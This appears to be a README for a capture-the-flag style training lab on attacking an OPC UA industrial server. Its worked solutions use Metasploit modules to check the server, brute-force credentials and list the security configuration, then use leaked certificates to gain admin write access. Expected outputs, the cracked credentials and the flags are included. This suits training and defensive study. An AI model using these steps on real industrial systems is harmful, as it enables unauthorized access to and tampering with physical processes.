# OPC UA

In this example we try to attack OPA UA.
For this install opcua-client.

```sh
pip3 install opcua-client
```

Remove configuration file for the OpcUaClient if there is any:
```sh
rm -rf .config/FreeOpcUa/OpcUaClient.conf
```

## Brute forcing user password
One way to log in to the OPC UA Server from the OPC UA Client is to use a username and a password. The objective of this part of the training is to reveal a valid username with the corresponding password. To do this, try to crack a user's authentication password using a brute force attack. Use the Metasploit module for OPC UA:   
https://github.com/COMSYS/msf-opcua/tree/master

To set up of the scanner module, follow the *Instructions* in the README.md of the link. It's necessary to install the opcua-module via pip: `pip3 install opcua`. Metasploit is installed in Kali by default. Add the `modules` directory found in this repository to the `modules` directory of Metasploit. This is located under the path `~/.msf4/modules`.   

Then use *opcua_hello* to verify that an OPC UA Server is running on an open port by following step 2 of the *Typical Workflow* described.   
If this is successful, follow step 4 and use *opcua_login* to brute force credentials for OPC UA Server instances. As input credential the input file, *credentials.txt* located in this folder should be used.   
(hints: IP 10.0.0.1, PORT 4840, FILE CybICS/training/opcua/credentials.txt)

In the case of a successful brute force attack, you should see the username and password labeled *success* as output. This procedure can also be traced in Wireshark and the usernames and passwords used in the attack can be read out in plaintext. 


### Get the user flag
The flag has the format "CybICS(flag)".

**Hint**: The flag is readable on the OPC UA system of the user, which you need to brute force
<details>
  <summary>Solution</summary>

  Check if connection to OPC UA works with:
  ```
  msf6 > use auxiliary/scanner/opcua/opcua_hello
  msf6 auxiliary(scanner/opcua/opcua_hello) > set rhosts 10.0.0.1
  msf6 auxiliary(scanner/opcua/opcua_hello) > set rport 4840
  msf6 auxiliary(scanner/opcua/opcua_hello) > run
  ```

  Expected outcome:
  ```
  [*] Running for 10.0.0.1...
  [+] 10.0.0.1:4840 - Success
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```

  Use `opcua_login` to bruteforce login:
  ```
  msf6 > use auxiliary/scanner/opcua/opcua_login
  msf6 auxiliary(scanner/opcua/opcua_login) > set rhosts 10.0.0.1
  msf6 auxiliary(scanner/opcua/opcua_login) > set port 4840
  msf6 auxiliary(scanner/opcua/opcua_login) > set userpass file:<CybICS_root_Folder>/CybICS/training/opcua/credentials.txt
  ```

  Expected outcome:
  ```
  [*] Running for 10.0.0.1...
  [*] 10.0.0.1:4840 - Valid OPC UA response, starting analysis
  ...
  [+] 10.0.0.1:4840 - [101/132] - user1:test - Success
  ...
  ```

  Username: user1
  Passwort: test
  
  :anger: Flag: CybICS(OPC-UA)
  ![Flag opcua](doc/opcua_user.png)
</details>

## Getting an overview of the security configuration
Use the metasploit module `auxiliary/scanner/opcua/opcua_server_config` for this investigation

<details>
  <summary>Solution</summary>
  
  ```
  msf6 > use auxiliary/scanner/opcua/opcua_server_config
  msf6 auxiliary(scanner/opcua/opcua_server_config) > set rhosts 10.0.0.1
  msf6 auxiliary(scanner/opcua/opcua_server_config) > set rport 4840
  msf6 auxiliary(scanner/opcua/opcua_server_config) > set username user1
  msf6 auxiliary(scanner/opcua/opcua_server_config) > set password test
  msf6 auxiliary(scanner/opcua/opcua_server_config) > set authentication Username
  msf6 auxiliary(scanner/opcua/opcua_server_config) > run
  ```
</details>

## Getting admin access
Previously, you had read-only access to the variables, which meant you could view but not modify them.
The next step is to obtain admin access to the OPC UA device.
This will allow you to change the variables and acquire the admin flag.
From previous investigation, you found certificates used for the OPC-UA communication under `CybICS/software/opcua/certificates/trusted`.
Use the leaked certificates to authenticated to the OPC-UA system.


<details>
  <summary>Solution</summary>
  Use opcua-client and configure on `Connect option` the usage of the certificate.
  ```
  opcua-client
  ```

  Now you can change the variable `Set > 0 to obtain flag!` to a value bigger than zero and access the variable for the admin flag `adminFLAG`
  
  :anger: Flag: CybICS(OPC-UA-$ADMIN)
  ![Flag opcua](doc/opcua_admin.png)
</details>